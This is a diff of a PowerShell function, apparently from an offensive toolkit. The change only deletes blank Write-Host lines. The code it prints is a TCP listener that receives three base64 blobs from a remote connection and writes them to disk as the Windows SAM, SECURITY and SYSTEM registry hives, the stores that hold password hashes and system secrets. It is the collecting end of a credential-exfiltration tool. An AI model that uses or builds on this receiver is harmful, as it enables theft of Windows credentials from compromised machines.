@@ -16,16 +16,13 @@ function Invoke-Reciever {
     $byte2 = New-Object byte[] 1000000
     $byte3 = New-Object byte[] 50000000
 
-    Write-Host
     Write-Host Waiting For Connection...
 
     $client = $listener.AcceptTcpClient()
     $stream = $client.GetStream()
 
     Write-Host Connected
-    Write-Host
     Write-Host Recieveing Data...
-    Write-Host
 
     $bytes1 = $stream.read($byte1, 0, $byte1.Length)
     $stream.Write('0',0,1)
@@ -34,37 +31,27 @@ function Invoke-Reciever {
     $bytes3 = $stream.read($byte3, 0, $byte3.Length)
 
     Write-Host Recieved all Data
-    Write-Host
     Write-Host Starting Data Processing...
-    Write-Host
     Write-Host Processing SAM
-    Write-Host
 
     $msg1 += [text.encoding]::ASCII.GetString( (1..$bytes1 | ForEach-Object { $byte1[$_-1] } ) )
     [IO.File]::WriteAllBytes('.\SAM', [Convert]::FromBase64String($msg1))
 
     Write-Host Processed SAM
-    Write-Host
     Write-Host Processing SECURITY
-    Write-Host
 
     $msg2 += [text.encoding]::ASCII.GetString( (1..$bytes2 | ForEach-Object { $byte2[$_-1] } ) )
     [IO.File]::WriteAllBytes('.\SECURITY', [Convert]::FromBase64String($msg2))
 
     Write-Host Processed SECURITY
-    Write-Host
     Write-Host Processing SYSTEM
-    Write-Host
 
     $msg3 += [text.encoding]::ASCII.GetString( (1..$bytes3 | ForEach-Object { $byte3[$_-1] } ) )
     [IO.File]::WriteAllBytes('.\SYSTEM', [Convert]::FromBase64String($msg3))
 
     Write-Host Processed SYSTEM
-    Write-Host
     Write-Host Finished Processing
-    Write-Host
     Write-Host Stopping Server
-    Write-Host
 
     $listener.Stop()
     $listener.Server.Dispose()
